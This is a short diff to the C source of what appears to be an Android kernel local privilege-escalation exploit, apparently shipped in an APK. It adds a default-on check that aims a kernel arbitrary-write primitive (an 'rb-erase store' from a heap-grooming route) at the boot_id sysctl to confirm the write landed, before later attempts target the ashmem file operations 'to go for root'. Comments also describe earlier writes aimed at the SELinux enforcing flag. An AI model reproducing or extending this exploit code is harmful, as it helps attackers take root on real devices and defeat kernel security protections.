@@ -386,6 +386,19 @@ uintptr_t canon_addr(uintptr_t image_addr) {
   return text_addr(image_addr);
 }
 
+int bootid_proof_active;
+char bootid_proof_before[64];
+
+int bootid_write_proof_enabled(void) {
+  /* Default ON: the APK has no shell to set env, and attempt 1 of the route is
+   * cheap to spend on a definitive answer. Aims the rb-erase store at
+   * &sysctl_bootid instead of &ashmem_misc.fops; /proc/sys/kernel/random/boot_id
+   * changing is direct proof the dequeue store executed (harmless: proc_do_uuid
+   * only regenerates when uuid[8]==0, which our 8 bytes over uuid[0..7] leaves
+   * alone). Attempts 2+ re-groom with the real fops target and go for root. */
+  return env_flag("BOOTID_WRITE_PROOF", 1);
+}
+
 int enforcing_write_diag_enabled(void) {
   /* Default OFF now: the ENFORCING write-proof already answered its question
    * (shift=-2 walk_wrote=0). The shift sweep uses the real &ashmem_misc.fops
@@ -413,6 +426,11 @@ uintptr_t pselect_write_target(void) {
      * 1->0 proves the dequeue store executes; no flip => the walk provably never
      * writes despite the proven-perfect shift=-2 alignment. */
     return data_addr(SELINUX_ENFORCING);
+  }
+  if (bootid_proof_active) {
+    /* BOOTID-WRITE-PROOF: &sysctl_bootid, i.e. uuid[0..7] of the string served by
+     * /proc/sys/kernel/random/boot_id. Same walk path as the fops route. */
+    return data_addr(SYSCTL_BOOTID);
   }
   if (scratch_write_diag_enabled() && binwrite_target) {
     /* DIAGNOSTIC: aim the rb-erase write at a 0x41-filled scratch qword inside
